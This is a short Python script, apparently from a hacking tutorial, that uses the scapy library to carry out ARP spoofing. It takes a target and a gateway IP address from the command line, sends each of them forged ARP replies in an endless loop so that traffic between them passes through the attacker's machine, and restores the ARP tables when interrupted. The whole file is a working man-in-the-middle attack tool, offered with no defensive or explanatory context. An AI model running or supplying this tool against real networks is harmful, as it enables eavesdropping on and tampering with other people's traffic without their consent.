#! /usr/bin/env python

import scapy.all as scapy
import time
import optparse
#import sys for python2

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="IP address of the target")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="IP address of the gateway")
    options = parser.parse_args()[0]
    if not options.target_ip and not options.gateway_ip:
        print("[-] Please specify both the IP address of the target and gateway")
    elif not options.target_ip:
        print("[-] Please specify the IP address of the target")
    elif not options.gateway_ip:
        print("[-] Please specify the IP address of the gateway")
    else:
        return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
options = get_arguments()
target = options.target_ip
gateway = options.gateway_ip

try:
    while True:
        spoof(target, gateway)
        sent_packets_count += 1
        spoof(gateway, target)
        sent_packets_count += 1
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        #sys.stdout.flush() for python2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Resetting ARP tables...")
    restore(target, gateway)
    restore(gateway, target)
    print("Quitting...")
